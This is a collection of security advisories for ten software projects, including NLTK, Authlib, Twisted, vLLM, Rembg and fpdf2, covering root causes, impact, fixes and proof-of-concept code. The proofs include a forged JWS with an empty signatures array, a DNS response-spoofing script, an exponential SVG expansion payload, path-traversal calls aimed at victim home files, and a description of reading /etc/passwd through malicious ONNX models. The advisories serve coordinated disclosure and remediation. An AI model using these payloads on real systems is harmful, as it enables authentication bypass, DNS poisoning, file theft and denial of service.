summary: NLTK: WekaClassifier passes an unvalidated caller-controlled model path to the weka JVM, bypassing nltk.pathsec containment
description:
## Summary
`WekaClassifier` in NLTK passes a caller-controlled model file path to the weka Java VM without any `nltk.pathsec` validation. `WekaClassifier.train` puts the caller's `model_filename` verbatim into the weka argv `["-d", model_filename, ...]` (weka *writes* the trained model there), and `WekaClassifier._classify_many` puts `self._model` into `["-l", self._model, ...]` (weka *reads* it). Under `nltk.pathsec.ENFORCE=True` (the default on current HEAD), NLTK's stated invariant — established by advisory CVE-2026-81726 / GHSA-8mgp-746c-j5xp — is that caller-controlled model-artifact paths must be bounded to the allowed NLTK data roots before any native tool opens them. `WekaClassifier` is the one `java()`-based tool wrapper that skips this entirely, giving an untrusted workflow arbitrary-location file **write** (`-d`) and an arbitrary file **read/parse oracle** (`-l`), defeating pathsec containment.

This is a standalone, unfixed variant of the same class as CVE-2026-81726, on a code path the CVE-2026-81726 fix never touched. That advisory enumerates 6 functions (`TransitionParser.train`, `TransitionParser.parse`, `AveragedPerceptron.save`, `AveragedPerceptron.load`, `PerceptronTagger.save_to_json`, `save_maxent_params`) — `WekaClassifier` is not among them, and weka.py contains no `validate_tool_path`/`validate_model_resource` at all.

## Root Cause
`WekaClassifier.train(cls, model_filename, ...)` builds `cmd = [javaclass, "-d", model_filename, "-t", train_filename]` (nltk/classify/weka.py:256) and `WekaClassifier._classify_many` builds `[..., "-l", self._model, "-T", <staged>, ...]` (weka.py:131-133); `self._model` is stored unvalidated in `__init__` (weka.py:108-110). Only the internally-generated `train.arff`/`test.arff` are staged via `make_staging_dir`; the model path is passed as-is. `nltk.internals.java()` (internals.py:388-431) validates the classpath (`_verify_jar_sandbox`), the JVM launcher options (`_validate_java_options`, the CVE-2026-12841 fix), the main-class token `cmd[0]`, and rejects `@argfile` tokens in any position — but it explicitly permits program arguments starting with `-` and never inspects the interior of a program-arg path value. So `-d <path>` / `-l <path>` flow unchecked to `subprocess.Popen(final_cmd, shell=False)` and the weka JVM performs an unbounded native open/write on the caller-chosen path.

Sibling wrappers prove the intended pattern: `CRFTagger.train`/`set_model_file` call `validate_tool_path` (crf.py:134,300); `MaltParser.generate_malt_command` validates `-i`/`-o` via `validate_tool_path` (malt.py:340,344), its model via `validate_model_resource` (malt.py:326) and `working_dir` via `validate_path` (malt.py:206). weka.py already uses pathsec elsewhere (`validate_path` for WEKAHOME, `pathsec_open` for ARFF writes) but never for the model path.

## Impact
Under `pathsec.ENFORCE=True` (default on HEAD), an untrusted workflow that chooses the weka model save/load path obtains:
- Arbitrary-location file **write** via `-d` — overwrite or create a file at an attacker-chosen absolute or `..`-traversal path outside the allowed NLTK data roots (content constrained to weka's serialized-model format; the target choice is the integrity impact). This corrupts/clobbers arbitrary chosen files.
- Arbitrary file **read/parse oracle** via `-l` — weka loads an out-of-root path as a model, yielding an existence/parse differential (file content is not echoed back → confidentiality impact is limited).

This defeats the pathsec containment advisory CVE-2026-81726 promises, at the same privilege level / threat model that advisory was accepted under.

## Proof of Concept
```python
import nltk.pathsec as ps; ps.ENFORCE = True
from nltk.classify.weka import WekaClassifier
# write-side: model written OUTSIDE any allowed NLTK data root (refused for CRFTagger, allowed here)
WekaClassifier.train("/tmp/outside_sandbox/evil.model",
                     [({"a": 1}, "pos"), ({"a": 0}, "neg")])
# read-side: -l opens an arbitrary path
clf = WekaClassifier(fmt, "/home/victim/secret.model")
clf.classify_many([{"a": 1}])
```
The argv construction — the vulnerable step — is confirmed without weka installed (see Bypass Evidence); a configured weka.jar is needed only to observe the JVM's actual file I/O.

## Attack Chain
1. **Entry.** Action: an app running with `pathsec.ENFORCE=True` lets an untrusted workflow choose the weka model path and calls `WekaClassifier.train("../../../home/victim/x", featuresets)` (write) or `WekaClassifier(fmt, "/home/victim/secret.model").classify_many(...)` (read). Guard: none — plain classmethod/constructor parameter (weka.py:230,108-110). Bypass proof: grep shows weka.py uses no `validate_tool_path`/`validate_model_resource`/`validate_tool_dir` (NONE).
2. **Command build.** Action: the path is placed into `cmd = [javaclass, "-d", model_filename, "-t", train_filename]` (weka.py:256) / `["-l", self._model, ...]`. Guard: only the internally-generated `train.arff` is staged via `make_staging_dir`; the model path is passed as-is. Bypass proof: runtime capture yielded `['weka.classifiers.bayes.NaiveBayes', '-d', '/tmp/outside_sandbox_weka.model', '-t', '<staged>/train.arff']` — the raw out-of-root path is `cmd[2]`.
3. **java() sink.** Action: `java(cmd, classpath=_weka_classpath, ...)` → `subprocess.Popen(final_cmd)` (internals.py:431). Guard: `java()` validates classpath, JVM `options`, `cmd[0]`, and rejects `@argfile` tokens. Bypass proof: none of these inspect the `-d`/`-l` program-arg value; internals.py explicitly documents that program args after the main class may start with `-`, and the path is neither `cmd[0]` nor an `@`-token, so every `java()` gate passes. Negative control: the same path through `validate_tool_path(..., for_write=True, must_exist=False)` raises `PermissionError`.
4. **Impact.** Action: the weka JVM opens the path outside the allowed roots → arbitrary-location write (`-d`) / parse-existence oracle (`-l`). Guard: pathsec is never consulted (no `validate_tool_path`, no `pathsec_open`). Bypass proof: the directly-analogous sibling `CRFTagger.train` calls `validate_tool_path(model_file, must_exist=False)` (crf.py:300); weka does not, and commit `ee6d6138` hardened weka's other sinks (scratch files, WEKAHOME jar) while leaving the model path unvalidated.

## Bypass Evidence
- Negative control (guard is real): `validate_tool_path("/tmp/outside_sandbox_weka.model", for_write=True, must_exist=False)` → `PermissionError`; `validate_tool_path("../../../home/victim/.ssh/authorized_keys", ...)` → `PermissionError`.
- Sink reached unvalidated (guard absent): captured write-side argv `['weka.classifiers.bayes.NaiveBayes', '-d', '/tmp/outside_sandbox_weka.model', '-t', '<staged>/train.arff']` and read-side `[..., '-l', '/home/victim/secret.model', '-T', '<staged>/test.arff', '-p', '0']`.
- Version: `git show v3.10.3:nltk/classify/weka.py` contains both the `-d` model-path build (line 235) and the `-l` read, and NO `validate_tool_path`.

## Affected Versions
`<= 3.10.3` (present on the latest release tag v3.10.3 and on HEAD `c06cd264`). No published fix has ever targeted the weka `-d`/`-l` model path; commits after v3.10.3 (`ee6d6138`, `92aeada6`, `a9752559`) touched weka.py for other sinks but did not add model-path validation.

## Suggested Fix
Before building the `-d`/`-l`/`-T` command, validate the model path with pathsec, mirroring `CRFTagger`/`MaltParser`:
```python
validate_tool_path(model_filename, context="WekaClassifier.train", for_write=True, must_exist=False)
validate_tool_path(self._model, context="WekaClassifier._classify_many")
```


---
Reported by **zx (Jace)** — GitHub: @manus-use

## Fix status (2026-09-28)

Status: MERGED on develop (unreleased; v3.10.3 of 2026-08-12 predates the fix).

PR: #3863 "Bound the WekaClassifier model path to the pathsec data roots", merged 2026-09-06, merge commit bc2878725 on develop. Fix commit: 6a1760629.

Probe: nltk/test/unit/security_probes/ghsa_j456_xh4h_cpf2.py, added by PR #3905 "Add GHSA-j456 live probe; expand the GHSA-8mgp probe attack set" (commit a96715264, merged 2026-09-20, merge commit 84d987bf8); verdict on develop 2fa3f48fe: FIXED (WekaClassifier -l and -d refuse out-of-root model paths).

Release: none yet; no release tag contains 6a1760629.

summary: Authlib: empty signatures validation in JWS JSON deserialization
description:
Authlib (prior to 1.9.0) contains a signature verification bypass vulnerability. The JsonWebSignature.deserialize_json() method accepts a JSON Serialization JWS object and returns the payload as successfully verified without checking for a signature and without requiring a cryptographic key.

## Root cause

`authlib/jose/rfc7515/jws.py`, read on the installed 1.8.0 artifact:

```python
is_valid = True                        # set before anything is checked
for header_obj in obj["signatures"]:   # empty array means the body never runs
    jws_header, valid = self._validate_json_jws(...)
    if not valid:
        is_valid = False
...
if is_valid:
    return rv                          # returns the payload as verified
```

`is_valid` is initialised to `True` and only ever set to `False` from inside the loop. A JWS JSON
Serialization object whose `signatures` array is empty iterates zero times, so the flag survives and
the payload is returned as successfully verified. No key is consulted, because no signature is
examined.

## Reproduction

```python
import base64
from authlib.jose import JsonWebSignature

def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

jws = JsonWebSignature()
payload = b'{"sub":"attacker","role":"admin"}'
forged = {"payload": b64(payload), "signatures": []}

print(jws.deserialize_json(forged, key=None))
```

Observed on authlib 1.8.0, Python 3.14, clean virtualenv:

```
[A] ATTACK   general JSON, signatures:[] , key=None
    ACCEPTED  -> {'header': [], 'payload': b'{"sub":"attacker","role":"admin"}'}
[B] ATTACK   general JSON, signatures:[] , key=<real key>
    ACCEPTED  -> {'header': [], 'payload': b'{"sub":"attacker","role":"admin"}'}
[C] CONTROL+ genuine general JSON with 2 signatures, right key
    ACCEPTED (expected) payload= b'{"sub":"attacker","role":"admin"}'
[D] CONTROL- same object, first signature corrupted
    rejected (expected): BadSignatureError bad_signature:
[E] CONTROL- signatures array removed entirely (not empty, absent)
    rejected: DecodeError Missing "protected" value:
```

[C] proves the verifier works normally on a genuine object, so a deployment looks healthy. [D] proves
tampering is caught. [E] proves this is specifically the empty-array case and not a general
missing-member bug. [A] and [B] are the bypass, and [B] shows that holding the correct key does not
save a caller: the empty array is accepted either way.

For comparison, joserfc 1.7.5, the library this module's deprecation warning points users to, rejects
the identical object with `BadSignatureError`. The correct behaviour already exists in your newer
library.

## Impact

Any relying party that calls `JsonWebSignature.deserialize_json()` on input it did not produce will
accept an attacker-authored payload as signed. Where that payload carries identity or authorisation
claims, this is a complete authentication bypass by an unauthenticated remote caller with no key
material. 

## What would fix it

In `_deserialize_json`, reject an empty `signatures` array before the loop, or initialise the flag
from the signature count, for example `is_valid = len(obj["signatures"]) > 0`. Pull request #938
proposes the same thing.

summary: better-auth: Device login approval does not show the requesting client or permissions
description:
## Am I affected?

You may be affected if you use `better-auth` from `1.3.8-beta.3` up to, but not including, `1.7.0-rc.3`, and you enable the `deviceAuthorization()` plugin. This range includes all 1.6 releases.

You are affected only if all of these are also true:

- An attacker can start a device request: `validateClient` is not configured, or the attacker can use a valid public client.
- Before allowing approval, your approval page does not show, from server-checked data, which client is asking and the exact permissions it requests.
- Users may approve a code or complete verification link they did not start and cannot compare with a device they have.
- Your application accepts the session token that the device flow returns, for example through the bearer plugin.

You are not affected if you do not enable the opt-in `deviceAuthorization()` plugin.

## Summary

The device authorization plugin lets a user sign in on one device by approving a short code on another. In affected versions, the approval information given to the user leaves out which client asked for access and which permissions it wants. The official approval examples therefore show only a generic request and a code, so users cannot tell their own device from an attacker's request.

## Impact

An attacker who convinces a signed-in user to approve the attacker's code receives a live Better Auth session token for that user. The attacker can then read or change any data the user's account can access. The attack needs the opt-in device flow, a request the attacker creates, and a user who actively approves it; it is not a sign-in bypass without user action.

## Patches

The fix first shipped in `1.7.0-rc.3`. Upgrade to `better-auth@1.7.0` or later. No 1.6 release contains the fix.

After upgrading, `GET /device` returns the requesting `client_id` and `scope` to the signed-in account that owns the request. If you built your own approval page, update it to show that client and those permissions, and keep approval disabled until they load.

## Workarounds

If you cannot upgrade yet, do the following:

- Disable `deviceAuthorization()`, or block untrusted access to `/device/code`.
- Configure a strict `validateClient` allowlist. Do not rely on the allowlist alone: it limits who can start the flow, but it does not give users the missing approval information.
- Build your own approval endpoint. It should read the pending request from trusted server-side storage and map the checked client identifier to a trusted display name. Show the exact requested permissions and the user code. Keep approval disabled until this information loads.
- Tell users to reject device requests they did not expect. They should approve only when the same code is visible right now on a device they have.

## Technical details

A device starts the flow by calling `/device/code`. The plugin stores the client identifier and any requested scope with the pending request. Before approval, `GET /device` returns only the user code and its status. This is true even for a signed-in session of the user account that owns the request. An approval page built from that response cannot show which client asked for access or which permissions it wants. After approval, the original device code can be redeemed at `/device/token` for a Better Auth session token.

RFC 8628 describes this remote phishing scenario. It recommends that the server tell users they are authorizing a device and ask them to confirm that the device is in their possession. It also recommends showing device information that helps users detect impersonation. Client allowlisting reduces who can start the flow, but it does not give users the missing approval information. A valid public client can therefore still be affected when its identifier and requested permissions are not shown.

summary: Pylint: Arbitrary code execution via pickle deserialization of the stats cache in PYLINT_HOME
description:
### Impact

Since 2006 / pylint 0.15.2, pylint caches its stats as pickles in `PYLINT_HOME` and reload them on the next run with `pickle.load`. Someone without access to the configuration or linted code, but with access to the cache directory (predictable `PYLINT_HOME` on a multi-user host) can write a crafted pickle that will runs arbitrary code when pylint access its stat cache.

### Patches

From pylint 4.0.9, the result cache is now stored as JSON instead of pickle, preventing code-execution. 

### Workarounds

Until upgrading do not point `PYLINT_HOME` to an untrusted, shared, or group-writable directory. The default value, `~/.cache/pylint`, is writable only by the user running pylint.

### Credits

- Reported privately via Tidelift coordinated disclosure (Dan Lenz).

summary: Satori-generated SVG has improper escaping
description:
## Impact

Satori does not properly escape certain values before including them in generated SVG output. This can allow crafted values to be interpreted as SVG markup.

The impact depends on how the generated SVG is consumed.

## Workaround

No complete workaround exists besides upgrading. Applications that cannot immediately upgrade should not render attacker-controlled content with Satori.

summary: vllm p2p never connected zmq_exhaustion
description:
### Summary

When the `OffloadingConnector` uses `TieringOffloadingSpec` with a P2P secondary tier, an API client can submit many unique non-listening peer addresses through `kv_transfer_params.prefill`. vLLM keeps every never-established P2P session and its ZeroMQ sockets after the request finishes. On vLLM 0.26.0, 340 such peers filled the default ZeroMQ context socket quota; creating the next peer raised an uncaught `ZMQError`, terminated `EngineCore`, and shut down the API server. The path was reproduced with a normal API key and no access to the internal P2P listener.

### Details

#### Root cause

In vLLM 0.26.0, `P2PSecondaryTierManager.on_new_request()` reads the following request-controlled fields:

```json
{
  "kv_transfer_params": {
    "prefill": {
      "kv_request_id": "id",
      "remote_host": "127.0.0.1",
      "remote_port": 49101
    }
  }
}
```

`on_new_request()` calls `_get_or_create_session(peer_id)`. This calls `ZmqTransport.connect()`, creates a `P2PSession`, and stores it in `_sessions` before the asynchronous ZeroMQ connection has been established.

`ZmqTransport._open_connection()` creates a DEALER, enables a libzmq monitor, creates a PAIR socket for that monitor, calls `dealer.connect()`, and immediately stores the resulting `ZmqConnection` in `_connections`. Returning from `dealer.connect()` does not prove that the peer is reachable.

The monitor subscribes only to `zmq.EVENT_DISCONNECTED`. A peer that never accepts the initial connection produced `EVENT_CONNECT_DELAYED`, `EVENT_CONNECT_RETRIED`, and `EVENT_CLOSED`, but no `EVENT_DISCONNECTED` during a 60-second observation. The production monitor therefore never calls `mark_dead()`, and `ZmqConnection.alive` remains true.

Request completion calls `session.finish_request()`, but does not close or remove the peer session. The manager reaps only a session for which `session.connected and not session.alive` is true. A never-established peer remains `connected=True`, `alive=True`, and `ready=False`. There is no establishment deadline, idle eviction, or limit on pending or total peers.

Each unique retained peer uses about three sockets in the same ZeroMQ context: the DEALER, the monitor endpoint created by libzmq, and the PAIR monitor client. With the measured default `MAX_SOCKETS=1023`, 340 peers use approximately 1,020 sockets in addition to the local ROUTER. The next peer fails while creating its monitor PAIR. The exception escapes through `on_new_request()` and the scheduler into the EngineCore loop:

```text
P2PSecondaryTierManager._get_or_create_session()
  -> ZmqTransport.connect()
  -> ZmqTransport._open_connection()
  -> monitor_sock = self._zmq_ctx.socket(zmq.PAIR)
  -> zmq.error.ZMQError: Too many open files
  -> EngineDeadError
```

The process open-files limit was 65,536. The EngineCore had about 1,215 file descriptors at the failure point, so the failure was not the operating-system FD limit.

#### Boundary and controls

Each row below used a fresh vLLM process and pre-generated unique non-listening loopback ports.

| Test | Result |
|---|---|
| Default `MAX_SOCKETS=1023`, 340 unique peers | 340 HTTP 200 responses; 340 active peers; service healthy |
| Default limit, 344 unique peers, concurrency 4 | 340 HTTP 200 and 4 HTTP 500 responses; EngineCore and API exited |
| Default limit, 344 unique peers, concurrency 1 | Same 340-peer ceiling and service exit |
| Same endpoint repeated 512 times | 512 HTTP 200 responses; one active peer; service healthy |
| 512 requests without P2P parameters | 512 HTTP 200 responses; no active peers; service healthy |

A diagnostic A/B changed only the context `MAX_SOCKETS` value. Raising it from 1,023 to 2,048 moved the last fully successful point from 340 to 682 peers. The 683rd peer then raised the same `ZMQError` and terminated the service. The approximately 2.01x movement in the boundary identifies the ZeroMQ context quota as the exhausted resource.

The failure runs used logging-only instrumentation around `_open_connection()` to record the context limit, peer count, and process FD count. It did not add or close any ZeroMQ socket and re-raised the original exception.

#### Related public work

[PR #47843](https://github.com/vllm-project/vllm/pull/47843) is an open, unmerged proposal that identifies client-supplied P2P peer addresses as an SSRF risk and proposes API sanitization plus a configured peer allowlist. Those changes would block this public API trigger, but the PR does not add a connection deadline, session cleanup, or a capacity limit for never-established peers. This report adds the deterministic resource-exhaustion and service-exit impact of the retained state.

[PR #49823](https://github.com/vllm-project/vllm/pull/49823) fixes cleanup and reconnection after a connection has been marked dead. A peer that never establishes does not receive the subscribed `EVENT_DISCONNECTED` event, so it never enters that dead-state cleanup path.

### Impact

This is uncontrolled resource consumption leading to denial of service. An attacker needs network access to an OpenAI-compatible inference endpoint and a normal API key when `--api-key` is enabled. The attacker does not need access to the internal P2P control or data ports and does not need any peer to answer.

Only deployments that explicitly enable `OffloadingConnector`, `TieringOffloadingSpec`, and a P2P secondary tier are affected. Repeating a cheap one-token request with unique non-listening endpoints steadily consumes scheduler and ZeroMQ resources. In the tested default context, about 341 requests were enough to terminate EngineCore and stop all inference on the instance until restart. Confidentiality and integrity were not affected; the demonstrated impact is availability loss.

This advisory was fixed in [MR51504](https://github.com/vllm-project/vllm/pull/51504).

summary: Rembg: Unauthenticated SAM model injection permits local-file disclosure through malicious ONNX graphs
description: The public `/api/remove` endpoint uses attacker-controlled `extras.sam_model` in both SAM filenames and GitHub download URLs. Path traversal plus a URL fragment lets an unauthenticated attacker place malicious ONNX models beside a target file. The models read the file as ONNX external data and encode its bytes into the returned PNG. This issue affects SAM's `sam_model` in 2.0.81 and returns complete file contents. *Screenshot 1 — First unauthenticated request primes the path and returns HTTP 500.* ### Technical details `rembg/commands/s_command.py:188-223,384-397` accepts public `extras` JSON and passes it to `new_session()`. `rembg/sessions/sam.py:313-355` inserts `sam_model` into encoder/decoder filenames and fixed GitHub URLs, then invokes `pooch.retrieve()` without a pinned hash. Requests removes the URL `#fragment`; the local POSIX path retains it. Pooch creates attacker-selected parent directories without enforcing cache containment. The first request creates the path tree and returns HTTP 500. The identical second request downloads the attacker asset twice and stores it as both SAM models beside the target. The graph uses a relative external tensor to read the target and maps every byte to mask pixels. rembg returns the mask as a PNG, which the attacker decodes back into the original bytes. *Screenshot 2 — The identical second request returns HTTP 200 with an encoded PNG.* ### Proof of concept The attached loopback-only PoC produced: ```text VULNERABLE: unauthenticated SAM model injection disclosed the synthetic /flag first-http=500 second-http=200 decoded-value=REMBG_AUDIT_SYNTHETIC_FLAG_2026_08_28 ``` The `/etc/passwd` variant produced: ```text VULNERABLE: disclosed /etc/passwd (839 bytes) root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ... nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin ``` The decoded contents matched `/etc/passwd` inside the owned container. Testing used a local TLS stand-in for GitHub; no public target was contacted. *Screenshot 3 — The decoder reconstructs all 839 bytes of `/etc/passwd`.* ### Impact An unauthenticated attacker can execute arbitrary ONNX computation and disclose complete files that rembg can reach under the required filesystem permissions. The supplied root-running container exposed both `/flag` and `/etc/passwd`. ### Remediation Allow only fixed SAM identifiers mapped server-side to fixed filenames, URLs, and pinned hashes. Reject path and URL syntax; canonicalize destinations and enforce cache containment before creating directories. Run the container as a non-root user with a read-only root filesystem. summary: Twisted: DNS Response Spoofing in twisted.names Due to Missing Source Address Validation
description:
### Summary

`twisted.names.dns.DNSDatagramProtocol`, the UDP transport used by twisted's DNS client (`twisted.names.client.Resolver`, `createResolver`, and anything built on it, including MX lookups in `twisted.mail`), accepts a DNS response for a pending query solely on the basis of the 16-bit transaction ID matching. It never checks that the response actually originated from the server the query was sent to. Any host that can deliver a UDP packet to the resolver's listening port with the correct transaction ID can inject a forged answer, independent of the real server's address. This is a materially weaker defense than standard DNS resolver practice (transaction ID plus source-address validation, typically also source-port rotation), and enables off-path DNS response spoofing / cache poisoning.

### Details

`DNSDatagramProtocol.datagramReceived` (`src/twisted/names/dns.py`, line 3350) is:

```python
def datagramReceived(self, data, addr):
    """
    Read a datagram, extract the message in it and trigger the associated
    Deferred.
    """
    m = Message()
    try:
        m.fromStr(data)
    except EOFError:
        ...
    except ValueError as ex:
        ...
    except BaseException:
        ...

    if m.id in self.liveMessages:
        d, canceller = self.liveMessages[m.id]
        del self.liveMessages[m.id]
        canceller.cancel()
        try:
            d.callback(m)
        except BaseException:
            log.err()
    else:
        if m.id not in self.resends:
            self.controller.messageReceived(m, self, addr)
```

The `addr` parameter, the UDP source address of the datagram, is accepted but never compared against the address the corresponding query was sent to. The only check is `m.id in self.liveMessages`, and `liveMessages` is keyed purely by the transaction ID chosen in `DNSMixin.pickID()`. The listening socket is a plain `listenUDP(0, self, maxPacketSize=512)` (line 3348), not connected to the queried server, so the kernel does not filter by source address either; any host can deliver a UDP datagram to this socket.

The transaction ID itself is generated with `secureRandom` (`randomSource()`, line 174), so it is not predictable, but at 16 bits it is a 1-in-65536 space per attempt. `twisted.names.client.Resolver`, the standard, documented DNS client, mitigates brute-force guessing of that space by creating a brand-new `DNSDatagramProtocol` bound to a fresh, independently random source port (`_connectedProtocol()`, `src/twisted/names/client.py` line 206, using `dns.randomSource()`) for every individual query, and tearing the socket down once the query completes (`_query()`, line 253). This gives an off-path attacker roughly 32 bits of combined entropy (port and transaction ID) to guess per query issued through the standard client, not just the 16 bits of the transaction ID alone.

The missing source-address check is still a real gap for two reasons. First, it removes a defense-in-depth backstop that DNS resolver best practice (RFC 5452) treats as independent from port and ID randomization; an attacker who is on-path, shares a broadcast domain or NAT with the resolver or the real DNS server, or is otherwise able to observe or narrow the ephemeral port faces no additional barrier at all, since source-address validation is exactly the check that would stop them. Second, `DNSDatagramProtocol` is itself a public, documented class; code that constructs one directly and issues more than one query against the same instance, rather than going through `client.Resolver`'s per-query protocol and port cycling, reuses the same source port for every query after the first, so guessing the 16-bit transaction ID alone is sufficient from that point on.

`twisted.names.client.Resolver` uses this same `DNSDatagramProtocol` class for every UDP query it issues, so every consumer of the standard twisted DNS client, including `twisted.mail`'s MX resolution, is subject to the same unauthenticated accept logic in `datagramReceived`, moderated by the per-query port rotation described above.

### PoC

```python
import socket
from twisted.internet import reactor
from twisted.names import dns

class CapturingController:
    def messageReceived(self, message, protocol, address):
        pass

def main():
    resolverProto = dns.DNSDatagramProtocol(CapturingController())
    resolverProto.startListening()

    real_server = ("203.0.113.1", 53)  # RFC 5737 TEST-NET-1, never answers
    query = dns.Query(b"victim.example.com", dns.A, dns.IN)
    d = resolverProto.query(real_server, [query], timeout=5)

    stolen_id = next(iter(resolverProto.liveMessages))
    resolver_port = resolverProto.transport.getHost().port

    forged = dns.Message(stolen_id, answer=1)
    forged.queries = [query]
    forged.answers = [
        dns.RRHeader(name=b"victim.example.com", type=dns.A, cls=dns.IN, ttl=60,
                     payload=dns.Record_A(address="6.6.6.6"))
    ]

    attacker_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    attacker_sock.bind(("127.0.0.1", 0))  # unrelated to real_server
    attacker_sock.sendto(forged.toStr(), ("127.0.0.1", resolver_port))

    def onResult(message):
        print("Resolver ACCEPTED forged response as the answer to its query to", real_server)
        print("Spoofed A record:", message.answers[0].payload.dottedQuad())
        reactor.stop()

    d.addCallback(onResult)

reactor.callWhenRunning(main)
reactor.run()
```

Output:

```
Resolver listening on 127.0.0.1:54997, queried ('203.0.113.1', 53), id=6995
Forged response sent from ('127.0.0.1', 53644) (NOT ('203.0.113.1', 53))
Resolver ACCEPTED forged response as the answer to its query to ('203.0.113.1', 53)
Spoofed A record: 6.6.6.6
```

The query was sent to `203.0.113.1:53`, an address reserved by RFC 5737 for documentation and testing that will never respond. The forged response was sent from an unrelated local UDP socket bound to a different, unrelated port. The resolver accepted it as the legitimate answer purely because the transaction ID matched, proving the response's source address plays no role in validation.
### Impact

Any application resolving hostnames through `twisted.names` can have DNS answers forged by a network party able to deliver a UDP packet to the resolver's listening port with the correct transaction ID, and, for the standard `client.Resolver` path, the correct ephemeral source port too. An on-path attacker, or one sharing a broadcast domain or NAT with the resolver or the real DNS server, faces no meaningful barrier at all, since source-address validation is exactly the check that would stop them and it is absent. An off-path attacker targeting the standard `client.Resolver` API must win a roughly 32-bit combined guess (port and transaction ID) within the query timeout window; the same attacker targeting code that uses the public `DNSDatagramProtocol` class directly across multiple queries on one instance, a supported usage pattern, faces only the 16-bit transaction ID space per query after the first. A successful forgery lets an attacker redirect hostname resolution to an address of their choosing, enabling mail interception (spoofed MX/A records), SSRF, or man-in-the-middle positioning against anything that trusts the resolved address.

summary: SiYuan: MCP file tool's blocklist is incomplete relative to the HTTP file API it claims to align with, exposing publish-mode passwords and other sensitive workspace files
description:
## Summary

`kernel/mcp/tools/file.go`'s `resolvePath()` includes an explicit comment stating its
sensitive-path blocklist is meant to align with the HTTP file API's established blacklist
(`refuseToAccess()` in `kernel/api/file.go`), following the remediation for GHSA-cvhv-7xhj-xjp8
("Unauthenticated Administrator takeover exfiltrated via the MCP"), which specifically
recommended restricting this tool's scope. In practice, the MCP tool implements only 1 of the
4 static blocklist entries the HTTP API enforces.

## Comparison

`kernel/api/file.go` `refuseToAccess()` blocks:
1. `conf/conf.json` (API token, cookie signing key, accessAuthCode)
2. `data/snippets/conf.json`
3. the entire `data/templates` directory
4. `data/.siyuan/publishAccess.json`
5. (dynamic, per-request) any path the current publish-mode session isn't authorized for

`kernel/mcp/tools/file.go` `resolvePath()` blocks only:
```go
confPath := filepath.Join(util.ConfDir, "conf.json")
if abs == confPath {
    return "", fmt.Errorf("access to conf.json is forbidden")
}
```
Items 2, 3, and 4 are absent. The tool's own `list`/`read`/`grep`/`find` actions remain fully
functional against them.

## Impact

An MCP client with access to the `file` tool (post-fix for GHSA-cvhv-7xhj-xjp8, i.e. a properly
authenticated Administrator-level caller) can read `data/.siyuan/publishAccess.json` directly:

```go
type PublishAccessItem struct {
    ID       string `json:"id"`
    Visible  bool   `json:"visible"`
    Password string `json:"password"` // plaintext; empty string = no password
    Disable  bool   `json:"disable"`
}
```

This exposes the plaintext access password for every publish-mode-shared notebook/document,
letting the reader bypass password protection on any publish-mode share. This is a serious
sibling issue given the volume of publish-mode access-control bugs already reported against this
codebase — the passwords protecting exactly that feature are directly readable through a tool
whose own description says "never use for workspace data."

`data/templates` and `data/snippets/conf.json` are lower-severity but still inconsistent with
the HTTP API's own precedent for what counts as sensitive.

## Why this is a distinct finding, not a duplicate

GHSA-cvhv-7xhj-xjp8 was about *reachability* an unauthenticated Reader-tier JWT being forwarded
to admin-scoped paths including `/mcp`. That has been fixed. This report is about the *tool's own
scope* once reached by a legitimate, properly-authenticated caller, the remediation notes for
that same advisory explicitly called for restricting `resolvePath` to
`WorkspaceDir/temp/siyuan/*.log`, which was not implemented; instead the tool retains
workspace-wide scope with only a single-file blocklist addition.

## Suggested fix

Either replicate the full `refuseToAccess()` blocklist in `resolvePath()` (minimum fix, keeps
parity with the HTTP API going forward by extracting `refuseToAccess`'s path list into a shared
helper both call), or implement the originally-recommended allowlist restricting the tool to
`WorkspaceDir/temp/siyuan/*.log` for read and disabling write/delete/rename/copy entirely unless
the caller is Administrator, matching the tool's own advertised "debugging/log reading only"
scope.

summary: fpdf2: Exponential SVG '<use>' expansion causes CPU and memory exhaustion in 'FPDF.image()'
description:
### Summary

fpdf2 expands SVG `<use>` references by deep-copying the complete referenced graphics tree. A small SVG can use nested references to make the number of in-memory objects grow exponentially, causing excessive CPU and memory consumption during `FPDF.image()` processing.

This was reproduced with an 895-byte SVG on fpdf2 2.8.7. Under a 128 MB process limit, the input kept the process busy for about 14 seconds before raising `MemoryError`. 

### Details

The issue is in fpdf2's own SVG reference handling. It does not rely on XML entities, external URLs, local files, or vulnerable behavior in another dependency.

When fpdf2 resolves an SVG reference, [`SVGObject.build_xref()`](https://github.com/py-pdf/fpdf2/blob/a3307f96a0d165831029b3fb644aee5a7ca03328/fpdf/svg.py#L1584) passes the referenced object to `GraphicsContext.add_item()`:

```python
pdf_group.add_item(self.cross_references[ref])
```

[`GraphicsContext.add_item()`](https://github.com/py-pdf/fpdf2/blob/a3307f96a0d165831029b3fb644aee5a7ca03328/fpdf/drawing.py#L3618-L3633) uses `clone=True` by default and deep-copies the object:

```python
def add_item(self, item, clone=True):
    if clone:
        item = deepcopy(item)
    self.path_items.append(item)
```

An attacker can define `g1` as eight references to `g0`, `g2` as eight references to `g1`, and so on. Each level adds only a small amount of XML, but fpdf2 copies the entire tree from the previous level eight times. The resulting work grows approximately as `8^n`.

`ResourceAccessPolicy` does not prevent this behavior because the SVG contains only inline objects and does not request any external resource. The same failure was reproduced on development commit `a3307f96a0d165831029b3fb644aee5a7ca03328` with `ResourceAccessPolicy.NONE`.

### PoC

This was tested on Linux with Python 3.13.5. The script applies a 128 MB address-space limit so the process fails safely instead of consuming all available system memory.

```python
import resource
import time

from fpdf import FPDF


groups = ['<g id="g0"><rect width="1" height="1"/></g>']
for level in range(1, 6):
    uses = f'<use href="#g{level - 1}"/>' * 8
    groups.append(f'<g id="g{level}">{uses}</g>')

svg = (
    '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
    '<defs>' + "".join(groups) + '</defs><use href="#g5"/></svg>'
).encode()

pdf = FPDF()
pdf.add_page()

limit = 128 * 1024 * 1024
resource.setrlimit(resource.RLIMIT_AS, (limit, limit))

print(f"payload size: {len(svg)} bytes")
started = time.perf_counter()

try:
    pdf.image(svg, w=10)
except MemoryError:
    elapsed = time.perf_counter() - started
    max_rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    print(f"MemoryError after {elapsed:.3f}s, max RSS: {max_rss} KiB")
```

```text
payload size: 895 bytes
MemoryError after 14.336s, max RSS: 115596 KiB
```

